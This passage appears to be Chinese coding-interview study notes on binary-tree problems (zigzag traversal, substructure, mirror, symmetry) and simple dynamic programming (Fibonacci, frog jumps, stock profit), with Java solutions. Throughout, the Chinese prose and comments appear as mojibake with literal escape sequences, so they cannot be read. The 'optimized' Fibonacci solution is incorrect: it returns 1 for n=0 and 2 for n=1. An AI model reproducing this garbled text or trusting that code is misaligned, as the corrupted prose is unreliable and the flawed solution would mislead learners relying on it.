¹èŠ‚ç‚¹çš„é˜Ÿåˆ— queue ï¼›\n- BFS å¾ªç¯ï¼š å½“ queue ä¸ºç©ºæ—¶è·³å‡ºï¼›\n  - æ–°å»ºåŒç«¯é˜Ÿåˆ— tmp ï¼Œç”¨äºä¸´æ—¶å­˜å‚¨å½“å‰å±‚æ‰“å°ç»“æœï¼›\n  - å½“å‰å±‚æ‰“å°å¾ªç¯ï¼š å¾ªç¯æ¬¡æ•°ä¸ºå½“å‰å±‚èŠ‚ç‚¹æ•°ï¼ˆå³ queue é•¿åº¦ï¼‰ï¼›\n    - å‡ºé˜Ÿï¼š é˜Ÿé¦–å…ƒç´ å‡ºé˜Ÿï¼Œè®°ä¸º nodeï¼›\n    - æ‰“å°ï¼š è‹¥ä¸ºå¥‡æ•°å±‚ï¼Œå°† node.val æ·»åŠ è‡³ tmp å°¾éƒ¨ï¼›å¦åˆ™ï¼Œæ·»åŠ è‡³ tmp å¤´éƒ¨\n    - æ·»åŠ å­èŠ‚ç‚¹ï¼š è‹¥ node çš„å·¦ï¼ˆå³ï¼‰å­èŠ‚ç‚¹ä¸ä¸ºç©ºï¼Œåˆ™åŠ å…¥ queue ï¼›\n  - å°†å½“å‰å±‚ç»“æœ tmp æ·»åŠ å…¥ res ã€‚\n- è¿”å›å€¼ï¼š è¿”å›æ‰“å°ç»“æœåˆ—è¡¨ res å³å¯ï¼›\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public List<List<Integer>> levelOrder(TreeNode root) {\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.add(root);\n        List<List<Integer>> res = new ArrayList<>();\n        if(root == null) return res;\n        while(!queue.isEmpty()) {\n            LinkedList<Integer> tmp = new LinkedList<>();//å®ç°åŒç«¯é˜Ÿåˆ—\n            for(int i = queue.size(); i > 0; i--) {\n                TreeNode node = queue.poll();\n                if(res.size() % 2 == 0) tmp.addLast(node.val); // å¥‡æ•°å±‚ï¼Œæ·»åŠ å…ƒç´ è‡³é˜Ÿåˆ—å°¾éƒ¨\n                else tmp.addFirst(node.val); // å¶æ•°å±‚ï¼Œæ·»åŠ å…ƒç´ åªé˜Ÿåˆ—å¤´éƒ¨\n                if(node.left != null) queue.add(node.left);\n                if(node.right != null) queue.add(node.right);\n            }\n            res.add(tmp);\n        }\n        return res;\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šå±‚åºéå† + å€’åº\n\n**å¶æ•°å±‚å€’åºï¼š** è‹¥ `res` çš„é•¿åº¦ä¸º **å¥‡æ•°** ï¼Œè¯´æ˜å½“å‰æ˜¯å¶æ•°å±‚ï¼Œåˆ™å¯¹ `tmp` æ‰§è¡Œ **å€’åº** æ“ä½œã€‚\n\n```java\nclass Solution {\n    public List<List<Integer>> levelOrder(TreeNode root) {\n        Queue<TreeNode> queue = new LinkedList<>();\n        List<List<Integer>> res = new ArrayList<>();\n        if(root != null) queue.add(root);\n        while(!queue.isEmpty()) {\n            List<Integer> tmp = new ArrayList<>();\n            for(int i = queue.size(); i > 0; i--) {\n                TreeNode node = queue.poll();\n                tmp.add(node.val);\n                if(node.left != null) queue.add(node.left);\n                if(node.right != null) queue.add(node.right);\n            }\n            if(res.size() % 2 == 1) Collections.reverse(tmp);\n            res.add(tmp);\n        }\n        return res;\n    }\n}\n```\n\n\n\n### å¤æ‚åº¦\n\n#### æ–¹æ³•1\n\n- æ—¶é—´å¤æ‚åº¦ O(N)ï¼š N ä¸ºäºŒå‰æ ‘çš„èŠ‚ç‚¹æ•°é‡ï¼Œå³ BFS éœ€å¾ªç¯ N æ¬¡ï¼Œå ç”¨ O(N)ï¼›\n\n  åŒç«¯é˜Ÿåˆ—çš„é˜Ÿé¦–å’Œé˜Ÿå°¾çš„æ·»åŠ å’Œåˆ é™¤æ“ä½œçš„æ—¶é—´å¤æ‚åº¦å‡ä¸º O(1)ã€‚\n\n- ç©ºé—´å¤æ‚åº¦ O(N) ï¼š æœ€å·®æƒ…å†µä¸‹ï¼Œå³å½“æ ‘ä¸ºæ»¡äºŒå‰æ ‘æ—¶ï¼Œæœ€å¤šæœ‰N/2 ä¸ªæ ‘èŠ‚ç‚¹ åŒæ—¶ åœ¨ queue ä¸­ï¼Œä½¿ç”¨ O(N) å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n#### æ–¹æ³•2\n\n- æ—¶é—´å¤æ‚åº¦ O(N)ï¼š N ä¸ºäºŒå‰æ ‘çš„èŠ‚ç‚¹æ•°é‡ï¼Œå³ BFS éœ€å¾ªç¯ N æ¬¡ï¼Œå ç”¨ O(N)ã€‚\n\n  å…±å®Œæˆå°‘äº N ä¸ªèŠ‚ç‚¹çš„å€’åºæ“ä½œï¼Œå ç”¨ O(N)ã€‚\n\n- ç©ºé—´å¤æ‚åº¦ O(N) ï¼š æœ€å·®æƒ…å†µä¸‹ï¼Œå³å½“æ ‘ä¸ºæ»¡äºŒå‰æ ‘æ—¶ï¼Œæœ€å¤šæœ‰ N/2 ä¸ªæ ‘èŠ‚ç‚¹åŒæ—¶åœ¨ queue ä¸­ï¼Œä½¿ç”¨ O(N) å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n# ç¬¬ 7 å¤© æœç´¢ä¸å›æº¯ç®—æ³•ï¼ˆç®€å•ï¼‰\n\n## 26.æ ‘çš„å­ç»“æ„\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸¤æ£µäºŒå‰æ ‘Aå’ŒBï¼Œåˆ¤æ–­Bæ˜¯ä¸æ˜¯Açš„å­ç»“æ„ã€‚(çº¦å®šç©ºæ ‘ä¸æ˜¯ä»»æ„ä¸€ä¸ªæ ‘çš„å­ç»“æ„)\n>\n>Bæ˜¯Açš„å­ç»“æ„ï¼Œ å³ Aä¸­æœ‰å‡ºç°å’ŒBç›¸åŒçš„ç»“æ„å’ŒèŠ‚ç‚¹å€¼ã€‚\n>\n>ä¾‹å¦‚:\n>ç»™å®šçš„æ ‘ A:\n>\n>         3\n>        / \\\n>       4   5\n>      / \\\n>     1   2\n>\n>ç»™å®šçš„æ ‘ Bï¼š\n>\n>```\n>   4 \n>  /\n> 1\n>```\n>\n>è¿”å› trueï¼Œå› ä¸º B ä¸ A çš„ä¸€ä¸ªå­æ ‘æ‹¥æœ‰ç›¸åŒçš„ç»“æ„å’ŒèŠ‚ç‚¹å€¼ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šA = [1,2,3], B = [3,1]\n>è¾“å‡ºï¼šfalse\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šA = [3,4,5,1,2], B = [4,1]\n>è¾“å‡ºï¼štrue\n>```\n\n### è§£ç­”\n\nç®—æ³•æµç¨‹ï¼š\n\n**`recur(A, B)` å‡½æ•°ï¼š**\n\n1.  **ç»ˆæ­¢æ¡ä»¶ï¼š**\n    1.  å½“èŠ‚ç‚¹ B ä¸ºç©ºï¼šè¯´æ˜æ ‘ B å·²åŒ¹é…å®Œæˆï¼ˆè¶Šè¿‡å¶å­èŠ‚ç‚¹ï¼‰ï¼Œå› æ­¤è¿”å› true ï¼›\n    2.  å½“èŠ‚ç‚¹ A ä¸ºç©ºï¼šè¯´æ˜å·²ç»è¶Šè¿‡æ ‘ A å¶å­èŠ‚ç‚¹ï¼Œå³åŒ¹é…å¤±è´¥ï¼Œè¿”å› false ï¼›\n    3.  å½“èŠ‚ç‚¹ A å’Œ B çš„å€¼ä¸åŒï¼šè¯´æ˜åŒ¹é…å¤±è´¥ï¼Œè¿”å› false ï¼›\n2.  **è¿”å›å€¼ï¼š**\n    1.  åˆ¤æ–­ Aå’Œ B çš„**å·¦**å­èŠ‚ç‚¹æ˜¯å¦ç›¸ç­‰ï¼Œå³ `recur(A.left, B.left)` ï¼›\n    2.  åˆ¤æ–­ A å’Œ B çš„**å³**å­èŠ‚ç‚¹æ˜¯å¦ç›¸ç­‰ï¼Œå³ `recur(A.right, B.right)` ï¼›\n\n**`isSubStructure(A, B)` å‡½æ•°ï¼š**\n\n1.  **ç‰¹ä¾‹å¤„ç†ï¼š** å½“ æ ‘ A ä¸ºç©º **æˆ–** æ ‘ B ä¸ºç©º æ—¶ï¼Œç›´æ¥è¿”å› false ï¼›\n2.  **è¿”å›å€¼ï¼š** è‹¥æ ‘ B æ˜¯æ ‘ A çš„å­ç»“æ„ï¼Œåˆ™å¿…æ»¡è¶³ä»¥ä¸‹ä¸‰ç§æƒ…å†µä¹‹ä¸€ï¼Œå› æ­¤ç”¨æˆ– `||` è¿æ¥ï¼›\n    1.  ä»¥ **èŠ‚ç‚¹ A ä¸ºæ ¹èŠ‚ç‚¹çš„å­æ ‘** åŒ…å«æ ‘ B ï¼Œå¯¹åº” `recur(A, B)`ï¼›\n    2.  æ ‘ B æ˜¯ **æ ‘ A å·¦å­æ ‘** çš„å­ç»“æ„ï¼Œå¯¹åº” `isSubStructure(A.left, B)`ï¼›\n    3.  æ ‘ B æ˜¯ **æ ‘ A å³å­æ ‘** çš„å­ç»“æ„ï¼Œå¯¹åº” `isSubStructure(A.right, B)`ï¼›\n\n![](https://img.jwt1399.top/img/202208141004156.png)\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public boolean isSubStructure(TreeNode A, TreeNode B) {\n        // è‹¥Aä¸Bå…¶ä¸­ä¸€ä¸ªä¸ºç©º,ç«‹å³è¿”å›false\n        if(A == null || B == null) {\n            return false;\n        }\n        // Bä¸ºAçš„å­ç»“æ„æœ‰3ç§æƒ…å†µ,æ»¡è¶³ä»»æ„ä¸€ç§å³å¯:\n        // 1.Bçš„å­ç»“æ„èµ·ç‚¹ä¸ºAçš„æ ¹èŠ‚ç‚¹,æ­¤æ—¶ç»“æœä¸ºrecur(A,B)\n        // 2.Bçš„å­ç»“æ„èµ·ç‚¹éšè—åœ¨Açš„å·¦å­æ ‘ä¸­,è€Œä¸æ˜¯ç›´æ¥ä¸ºAçš„æ ¹èŠ‚ç‚¹,æ­¤æ—¶ç»“æœä¸ºisSubStructure(A.left, B)\n        // 3.Bçš„å­ç»“æ„èµ·ç‚¹éšè—åœ¨Açš„å³å­æ ‘ä¸­,æ­¤æ—¶ç»“æœä¸ºisSubStructure(A.right, B)\n        return recur(A, B) || isSubStructure(A.left, B) || isSubStructure(A.right, B);\n    }\n\n    /*\n    åˆ¤æ–­Bæ˜¯å¦ä¸ºAçš„å­ç»“æ„,å…¶ä¸­Bå­ç»“æ„çš„èµ·ç‚¹ä¸ºAçš„æ ¹èŠ‚ç‚¹\n    */\n    private boolean recur(TreeNode A, TreeNode B) {\n        // è‹¥Bèµ°å®Œäº†,è¯´æ˜æŸ¥æ‰¾å®Œæ¯•,Bä¸ºAçš„å­ç»“æ„\n        if(B == null) {\n            return true;\n        }\n        // è‹¥Bä¸ä¸ºç©ºå¹¶ä¸”Aä¸ºç©ºæˆ–è€…Aä¸Bçš„å€¼ä¸ç›¸ç­‰,ç›´æ¥å¯ä»¥åˆ¤æ–­Bä¸æ˜¯Açš„å­ç»“æ„\n        if(A == null || A.val != B.val) {\n            return false;\n        }\n        // å½“Aä¸Bå½“å‰èŠ‚ç‚¹å€¼ç›¸ç­‰,è‹¥è¦åˆ¤æ–­Bä¸ºAçš„å­ç»“æ„\n        // è¿˜éœ€è¦åˆ¤æ–­Bçš„å·¦å­æ ‘æ˜¯å¦ä¸ºAå·¦å­æ ‘çš„å­ç»“æ„ && Bçš„å³å­æ ‘æ˜¯å¦ä¸ºAå³å­æ ‘çš„å­ç»“æ„\n        // è‹¥ä¸¤è€…éƒ½æ»¡è¶³å°±è¯´æ˜Bæ˜¯Açš„å­ç»“æ„,å¹¶ä¸”è¯¥å­ç»“æ„ä»¥Aæ ¹èŠ‚ç‚¹ä¸ºèµ·ç‚¹\n        return recur(A.left, B.left) && recur(A.right, B.right);\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(MN)ï¼š** å…¶ä¸­ M,N åˆ†åˆ«ä¸ºæ ‘ A å’Œ æ ‘ B çš„èŠ‚ç‚¹æ•°é‡ï¼›å…ˆåºéå†æ ‘ A å ç”¨ O(M) ï¼Œæ¯æ¬¡è°ƒç”¨ `recur(A, B)` åˆ¤æ–­å ç”¨ O(N)ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(M)ï¼š** å½“æ ‘ A å’Œæ ‘ B éƒ½é€€åŒ–ä¸ºé“¾è¡¨æ—¶ï¼Œé€’å½’è°ƒç”¨æ·±åº¦æœ€å¤§ã€‚å½“ M â‰¤ N æ—¶ï¼Œéå†æ ‘ A ä¸é€’å½’åˆ¤æ–­çš„æ€»é€’å½’æ·±åº¦ä¸º M ï¼›å½“ M \\> N æ—¶ï¼Œæœ€å·®æƒ…å†µä¸ºéå†è‡³æ ‘ A å¶å­èŠ‚ç‚¹ï¼Œæ­¤æ—¶æ€»é€’å½’æ·±åº¦ä¸º Mã€‚\n\n## 27.äºŒå‰æ ‘çš„é•œåƒ\n\n### é¢˜ç›®\n\n>è¯·å®Œæˆä¸€ä¸ªå‡½æ•°ï¼Œè¾“å…¥ä¸€ä¸ªäºŒå‰æ ‘ï¼Œè¯¥å‡½æ•°è¾“å‡ºå®ƒçš„é•œåƒã€‚\n>\n>ä¾‹å¦‚è¾“å…¥ï¼š\n>\n>         4\n>       /   \\\n>      2     7\n>     / \\   / \\\n>    1   3 6   9\n>\n>é•œåƒè¾“å‡ºï¼š\n>\n>         4\n>       /   \\\n>      7     2\n>     / \\   / \\\n>    9   6 3   1\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šroot = [4,2,7,1,3,6,9]\n>è¾“å‡ºï¼š[4,7,2,9,6,3,1]\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208131818608.png)\n\n#### æ–¹æ³•1ï¼šé€’å½’æ³•\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public TreeNode mirrorTree(TreeNode root) {\n        if(root == null) return null;\n        //ä»ä¸Šåˆ°ä¸‹ç›´æ¥äº¤æ¢å·¦å³å­æ ‘\n        TreeNode tmp = root.left;\n        root.left = root.right;\n        root.right = tmp;\n        \n        mirrorTree(root.left);\n        mirrorTree(root.right);\n        return root;\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šè¾…åŠ©æ ˆ\n\nç®—æ³•æµç¨‹ï¼š\n\n- ç‰¹ä¾‹å¤„ç†ï¼š å½“ root ä¸ºç©ºæ—¶ï¼Œç›´æ¥è¿”å› nullï¼›\n- åˆå§‹åŒ–ï¼š æ ˆï¼Œå¹¶åŠ å…¥æ ¹èŠ‚ç‚¹ rootã€‚\n- å¾ªç¯äº¤æ¢ï¼š å½“æ ˆ stack ä¸ºç©ºæ—¶è·³å‡ºï¼›\n  - å‡ºæ ˆï¼š è®°ä¸º node ï¼›\n  - æ·»åŠ å­èŠ‚ç‚¹ï¼š å°† node å·¦å’Œå³å­èŠ‚ç‚¹å…¥æ ˆï¼›\n  - äº¤æ¢ï¼š äº¤æ¢ node çš„å·¦ / å³å­èŠ‚ç‚¹ã€‚\n- è¿”å›å€¼ï¼š è¿”å›æ ¹èŠ‚ç‚¹ root ã€‚\n\n```java\nclass Solution {\n    public TreeNode mirrorTree(TreeNode root) {\n        if(root == null) return null;\n        Stack<TreeNode> stack = new Stack<>();\n      \tstack.add(root); \n        while(!stack.isEmpty()) {\n            TreeNode node = stack.pop();\n            if(node.left != null) stack.add(node.left);\n            if(node.right != null) stack.add(node.right);\n            TreeNode tmp = node.left;\n            node.left = node.right;\n            node.right = tmp;\n        }\n        return root;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n#### æ–¹æ³•1\n\n- æ—¶é—´å¤æ‚åº¦ O(N)ï¼š å…¶ä¸­ N ä¸ºäºŒå‰æ ‘çš„èŠ‚ç‚¹æ•°é‡ï¼Œå»ºç«‹äºŒå‰æ ‘é•œåƒéœ€è¦éå†æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œå ç”¨ O(N) æ—¶é—´ã€‚\n- ç©ºé—´å¤æ‚åº¦ O(N)ï¼š æœ€å·®æƒ…å†µä¸‹ï¼ˆå½“äºŒå‰æ ‘é€€åŒ–ä¸ºé“¾è¡¨ï¼‰ï¼Œé€’å½’æ—¶ç³»ç»Ÿéœ€ä½¿ç”¨ O(N) å¤§å°çš„æ ˆç©ºé—´ã€‚\n\n#### æ–¹æ³•2\n\n- æ—¶é—´å¤æ‚åº¦ O(N) ï¼š å…¶ä¸­ N ä¸ºäºŒå‰æ ‘çš„èŠ‚ç‚¹æ•°é‡ï¼Œå»ºç«‹äºŒå‰æ ‘é•œåƒéœ€è¦éå†æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œå ç”¨ O(N) æ—¶é—´ã€‚\n- ç©ºé—´å¤æ‚åº¦ O(N) ï¼š æœ€å·®æƒ…å†µä¸‹ï¼Œæ ˆ stack æœ€å¤šåŒæ—¶å­˜å‚¨ N+1/2ä¸ªèŠ‚ç‚¹ï¼Œå ç”¨ O(N) é¢å¤–ç©ºé—´ã€‚\n\n## 28.å¯¹ç§°çš„äºŒå‰æ ‘\n\n### é¢˜ç›®\n\n>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥åˆ¤æ–­ä¸€æ£µäºŒå‰æ ‘æ˜¯ä¸æ˜¯å¯¹ç§°çš„ã€‚å¦‚æœä¸€æ£µäºŒå‰æ ‘å’Œå®ƒçš„é•œåƒä¸€æ ·ï¼Œé‚£ä¹ˆå®ƒæ˜¯å¯¹ç§°çš„ã€‚\n>\n>ä¾‹å¦‚ï¼ŒäºŒå‰æ ‘ [1,2,2,3,4,4,3] æ˜¯å¯¹ç§°çš„ã€‚\n>\n>        1\n>       / \\\n>      2   2\n>     / \\ / \\\n>    3  4 4  3\n>\n>ä½†æ˜¯ä¸‹é¢è¿™ä¸ª [1,2,2,null,3,null,3] åˆ™ä¸æ˜¯é•œåƒå¯¹ç§°çš„:\n>\n>        1\n>       / \\\n>      2   2\n>       \\   \\\n>       3    3\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šroot = [1,2,2,3,4,4,3]\n>è¾“å‡ºï¼štrue\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šroot = [1,2,2,null,3,null,3]\n>è¾“å‡ºï¼šfalse\n>```\n\n### è§£ç­”\n\nå¯¹ç§°äºŒå‰æ ‘å®šä¹‰ï¼š å¯¹äºæ ‘ä¸­ ä»»æ„ä¸¤ä¸ªå¯¹ç§°èŠ‚ç‚¹ L å’Œ R ï¼Œä¸€å®šæœ‰ï¼š\n\n- L.val = R.valï¼š å³æ­¤ä¸¤å¯¹ç§°èŠ‚ç‚¹å€¼ç›¸ç­‰ã€‚\n- L.left.val = R.right.valï¼šå³ L çš„å·¦å­èŠ‚ç‚¹å’Œ R çš„å³å­èŠ‚ç‚¹å¯¹ç§°ï¼›\n- L.right.val = R.left.val ï¼šå³ L çš„å³å­èŠ‚ç‚¹å’Œ R çš„å·¦å­èŠ‚ç‚¹å¯¹ç§°ã€‚\n\næ ¹æ®ä»¥ä¸Šè§„å¾‹ï¼Œè€ƒè™‘ä»é¡¶è‡³åº•é€’å½’ï¼Œåˆ¤æ–­æ¯å¯¹èŠ‚ç‚¹æ˜¯å¦å¯¹ç§°ï¼Œä»è€Œåˆ¤æ–­æ ‘æ˜¯å¦ä¸ºå¯¹ç§°äºŒå‰æ ‘ã€‚\n\n![](https://img.jwt1399.top/img/202208131908122.png)\n\nç®—æ³•æµç¨‹ï¼š\n`isSymmetric(root)` ï¼š\n\n- ç‰¹ä¾‹å¤„ç†ï¼š è‹¥æ ¹èŠ‚ç‚¹ root ä¸ºç©ºï¼Œåˆ™ç›´æ¥è¿”å› true ã€‚\n- è¿”å›å€¼ï¼š å³ isSame(root.left, root.right) ;\n\n`isSame(L, R)` ï¼š\n\n- ç»ˆæ­¢æ¡ä»¶ï¼š\n  - å½“ L å’Œ R åŒæ—¶è¶Šè¿‡å¶èŠ‚ç‚¹ï¼š æ­¤æ ‘ä»é¡¶è‡³åº•çš„èŠ‚ç‚¹éƒ½å¯¹ç§°ï¼Œå› æ­¤è¿”å› true ï¼›\n  - å½“ L æˆ– R ä¸­åªæœ‰ä¸€ä¸ªè¶Šè¿‡å¶èŠ‚ç‚¹ï¼š æ­¤æ ‘ä¸å¯¹ç§°ï¼Œå› æ­¤è¿”å› false ï¼›\n  - å½“èŠ‚ç‚¹ L å€¼ ä¸ç­‰äºèŠ‚ç‚¹ R å€¼ï¼š æ­¤æ ‘ä¸å¯¹ç§°ï¼Œå› æ­¤è¿”å› false ï¼›\n- é€’æ¨å·¥ä½œï¼š\n  - åˆ¤æ–­ä¸¤èŠ‚ç‚¹ L.left å’Œ R.right æ˜¯å¦å¯¹ç§°ï¼Œå³ `isSame(L.left, R.right)` \n  - åˆ¤æ–­ä¸¤èŠ‚ç‚¹ L.right å’Œ R.left æ˜¯å¦å¯¹ç§°ï¼Œå³ `isSame(L.right, R.left)` \n- è¿”å›å€¼ï¼š ä¸¤å¯¹èŠ‚ç‚¹éƒ½å¯¹ç§°æ—¶ï¼Œæ‰æ˜¯å¯¹ç§°æ ‘ï¼Œå› æ­¤ç”¨ä¸é€»è¾‘ç¬¦ && è¿æ¥ã€‚\n\n```java\nclass Solution {\n    public boolean isSymmetric(TreeNode root) {\n        return root == null ? true : isSame(root.left, root.right);\n    }\n    boolean isSame(TreeNode L, TreeNode R) {\n        if(L == null && R == null) return true;\n        if(L == null || R == null || L.val != R.val) return false;\n        return isSame(L.left, R.right) && isSame(L.right, R.left);\n    }\n}\n```\n\n### å¤æ‚åº¦\n\nå¤æ‚åº¦åˆ†æï¼š\n\n- æ—¶é—´å¤æ‚åº¦ O(N) ï¼š å…¶ä¸­ N ä¸ºäºŒå‰æ ‘çš„èŠ‚ç‚¹æ•°é‡ï¼Œæ¯æ¬¡æ‰§è¡Œ isSame() å¯ä»¥åˆ¤æ–­ä¸€å¯¹èŠ‚ç‚¹æ˜¯å¦å¯¹ç§°ï¼Œå› æ­¤æœ€å¤šè°ƒç”¨ N/2 æ¬¡ isSame() æ–¹æ³•ã€‚\n- ç©ºé—´å¤æ‚åº¦ O(N)ï¼š æœ€å·®æƒ…å†µä¸‹ï¼ŒäºŒå‰æ ‘é€€åŒ–ä¸ºé“¾è¡¨ï¼Œç³»ç»Ÿä½¿ç”¨ O(N) å¤§å°çš„æ ˆç©ºé—´ã€‚\n\n# ç¬¬ 8 å¤© åŠ¨æ€è§„åˆ’ï¼ˆç®€å•ï¼‰\n\n## 10- I. æ–æ³¢é‚£å¥‘æ•°åˆ—\n\n### é¢˜ç›®\n\n>å†™ä¸€ä¸ªå‡½æ•°ï¼Œè¾“å…¥ `n` ï¼Œæ±‚æ–æ³¢é‚£å¥‘ï¼ˆFibonacciï¼‰æ•°åˆ—çš„ç¬¬ `n` é¡¹ï¼ˆå³ `F(N)`ï¼‰ã€‚æ–æ³¢é‚£å¥‘æ•°åˆ—çš„å®šä¹‰å¦‚ä¸‹ï¼š\n>\n>```\n>F(0) = 0,   F(1) = 1\n>F(N) = F(N - 1) + F(N - 2), å…¶ä¸­ N > 1.\n>```\n>\n>æ–æ³¢é‚£å¥‘æ•°åˆ—ç”± 0 å’Œ 1 å¼€å§‹ï¼Œä¹‹åçš„æ–æ³¢é‚£å¥‘æ•°å°±æ˜¯ç”±ä¹‹å‰çš„ä¸¤æ•°ç›¸åŠ è€Œå¾—å‡ºã€‚\n>\n>ç­”æ¡ˆéœ€è¦å–æ¨¡ 1e9+7ï¼ˆ1000000007ï¼‰ï¼Œå¦‚è®¡ç®—åˆå§‹ç»“æœä¸ºï¼š1000000008ï¼Œè¯·è¿”å› 1ã€‚\n>\n>**ç¤ºä¾‹ 1ï¼š**\n>\n>```\n>è¾“å…¥ï¼šn = 2\n>è¾“å‡ºï¼š1\n>```\n>\n>**ç¤ºä¾‹ 2ï¼š**\n>\n>```\n>è¾“å…¥ï¼šn = 5\n>è¾“å‡ºï¼š5\n>```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šåŠ¨æ€è§„åˆ’\n\n```java\nclass Solution {\n    public int fib(int n) {\n        if(n == 0 || n==1) return n;\n        int[] dp = new int[n + 1];\n        dp[0] = 0;\n        dp[1] = 1;\n        for(int i = 2; i <= n; i++){\n            dp[i] = dp[i-1] + dp[i-2];\n            dp[i] %= 1000000007;\n        }\n        return dp[n];\n    }\n}\n\n//ä¼˜åŒ–\nclass Solution {\n    public int fib(int n) {\n        int fn0 = 0, fn1 = 1, sum;\n        for(int i = 0; i <= n; i++){\n            sum = (fn0 + fn1) % 1000000007;\n            fn0 = fn1;\n            fn1 = sum; \n        }\n        return fn1;\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šçŸ©é˜µå¿«é€Ÿå¹‚\n\nã€‚ã€‚ã€‚\n\n### å¤æ‚åº¦\n\n#### æ–¹æ³•1\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** è®¡ç®— f(n) éœ€å¾ªç¯ n æ¬¡ï¼Œæ¯è½®å¾ªç¯å†…è®¡ç®—æ“ä½œä½¿ç”¨ O(1) ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** å‡ ä¸ªæ ‡å¿—å˜é‡ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n#### æ–¹æ³•2\n\n- **æ—¶é—´å¤æ‚åº¦ï¼šO(logn)**\n- **ç©ºé—´å¤æ‚åº¦ï¼šO(1)**\n\n## 10- II. é’è›™è·³å°é˜¶é—®é¢˜\n\n### é¢˜ç›®\n\n>ä¸€åªé’è›™ä¸€æ¬¡å¯ä»¥è·³ä¸Š1çº§å°é˜¶ï¼Œä¹Ÿå¯ä»¥è·³ä¸Š2çº§å°é˜¶ã€‚æ±‚è¯¥é’è›™è·³ä¸Šä¸€ä¸ª n çº§çš„å°é˜¶æ€»å…±æœ‰å¤šå°‘ç§è·³æ³•ã€‚\n>\n>ç­”æ¡ˆéœ€è¦å–æ¨¡ 1e9+7ï¼ˆ1000000007ï¼‰ï¼Œå¦‚è®¡ç®—åˆå§‹ç»“æœä¸ºï¼š1000000008ï¼Œè¯·è¿”å› 1ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šn = 2\n>è¾“å‡ºï¼š2\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šn = 7\n>è¾“å‡ºï¼š21\n>```\n>\n>ç¤ºä¾‹ 3ï¼š\n>\n>```\n>è¾“å…¥ï¼šn = 0\n>è¾“å‡ºï¼š1\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208171708144.png)\n\n```java\nclass Solution {\n    public int numWays(int n) {\n        if(n == 0 || n==1) return 1;\n        int[] dp = new int[n + 1];\n        dp[0] = 1;\n        dp[1] = 1;\n        for(int i = 2; i <= n; i++){\n            dp[i] = dp[i-1] + dp[i-2];\n            dp[i] %= 1000000007;\n        }\n        return dp[n];\n    }\n}\n\n//ä¼˜åŒ–\nclass Solution {\n    public int numWays(int n) {\n        int a = 1, b = 1, sum;\n        for(int i = 0; i < n; i++){\n            sum = (a + b) % 1000000007;\n            a = b;\n            b = sum;\n        }\n        return a;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** è®¡ç®— f(n) éœ€å¾ªç¯ n æ¬¡ï¼Œæ¯è½®å¾ªç¯å†…è®¡ç®—æ“ä½œä½¿ç”¨ O(1) ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1)ï¼š** å‡ ä¸ªæ ‡å¿—å˜é‡ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 63.è‚¡ç¥¨çš„æœ€å¤§åˆ©æ¶¦\n\n### é¢˜ç›®\n\n>å‡è®¾æŠŠæŸè‚¡ç¥¨çš„ä»·æ ¼æŒ‰ç…§æ—¶é—´å…ˆåé¡ºåºå­˜å‚¨åœ¨æ•°ç»„ä¸­ï¼Œè¯·é—®ä¹°å–è¯¥è‚¡ç¥¨ä¸€æ¬¡å¯èƒ½è·å¾—çš„æœ€å¤§åˆ©æ¶¦æ˜¯å¤šå°‘ï¼Ÿ\n>\n>ç¤ºä¾‹ 1:\n>\n>```\n>è¾“å…¥: [7,1,5,3,6,4]\n>è¾“å‡º: 5\n>è§£é‡Š: åœ¨ç¬¬ 2 å¤©ï¼ˆè‚¡ç¥¨ä»·æ ¼ = 1ï¼‰çš„æ—¶å€™ä¹°å…¥ï¼Œåœ¨ç¬¬ 5 å¤©ï¼ˆè‚¡ç¥¨ä»·æ ¼ = 6ï¼‰çš„æ—¶å€™å–å‡ºï¼Œæœ€å¤§åˆ©æ¶¦ = 6-1 = 5 ã€‚\n>æ³¨æ„åˆ©æ¶¦ä¸èƒ½æ˜¯ 7-1 = 6, å› ä¸ºå–å‡ºä»·æ ¼éœ€è¦å¤§äºä¹°å…¥ä»·æ 